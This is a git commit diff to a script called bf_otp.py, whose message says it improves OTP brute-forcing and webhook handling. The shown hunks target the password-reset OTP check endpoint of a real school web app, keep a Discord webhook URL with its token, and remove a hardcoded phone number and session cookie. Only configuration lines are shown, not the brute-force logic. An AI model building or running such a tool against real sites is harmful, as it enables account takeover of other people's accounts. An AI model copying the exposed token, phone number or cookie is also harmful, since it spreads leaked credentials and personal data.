a1d0b6749dc0eedec26987017ad770df7d8a528e
จอมเวทย์แห่งโลกไซเบอร์ <88232834+MarioBlox@users.noreply.github.com>
2025-07-11 12:59:36 +0700

    🔐 Update bf_otp.py: improve OTP brute-force and webhook handling

--- bf_otp.py
+++ bf_otp.py
@@ -5,8 +5,8 @@ import random
 import traceback
 
 
-MOBILE = "0892078160"
-REF_CODE = "cxESnU"
+MOBILE = ""
+REF_CODE = ""
 URL = "https://webapp.student.co.th/index.php/school/forget_new_mobile_otp/check_otp"
 WEBHOOK_URL = "https://discord.com/api/webhooks/1366837555886166179/20tW1XZgncw5RWd1lKgaOtceOmsPc0QB6dMusENn9FTFBkt1m04_b2EK_YBCo7y4KrgH"
 
@@ -21,7 +21,7 @@ HEADERS = {
     "sec-fetch-mode": "cors",
     "sec-fetch-site": "same-origin",
     "x-requested-with": "XMLHttpRequest",
-    "cookie": "PHPSESSID=nanqj8v0vl5amuna2q58alj002; LAST_LOGIN_USER_ID_SDC=153590; ci_session=%2BbNSrVcOOdyW0dmq7XtVgCwHSbZVDwTW3T4BI92M6YPkIXNyerMTQnhSCXxYJvqXkRcJX5dbi6IIWKFN9LTm6g7NV5RpkQi12%2FD65EYnfac2g2ryFiJzlZuVSJ%2FCeDbBdeMj4hbgcKDyfKgoAugLB%2FNE4FBM5zsTbkSmVJdXJkqZ8z6zyZvxUwbiqQVf2VLZJkiv0RfjqdKR%2Buoci0y5dl6qnLA4ykIR1LkVWjtM%2FpPco8k72UcnGKpGEbhacJLrMBJUcRPajSa0mK5W7xs%2BFZjvWg5MHadYyS3n4ZfUtP07%2BQjFd2VBn9EVfMjL8mkFgH4JvA3lvgSh53OIPXVzgZx5zBcs47rfqnhXtFp9TLVJOjPkUnpvpwqp8Dz4khXmHGUnbi6PFNe0KlnjZpPa0NcApl57ggP7fNr4B0QOtiJRbuA%2FZJgqSa1eRFiBwowY9ormkLM3pny6KQJeA4g7gCjzlC9DljEeS7O7Xv1CcRdee6jtbFoxzl%2FnGjvcAM5mMXEhZ2YlGiG1i6u%2BPedzqOlBlMuCFvaxBqayHgjWb00%3D",
+    "cookie": "",
     "Referer": "https://webapp.student.co.th/index.php/school/forget_new/edit/",
     "Referrer-Policy": "strict-origin-when-cross-origin"
 }
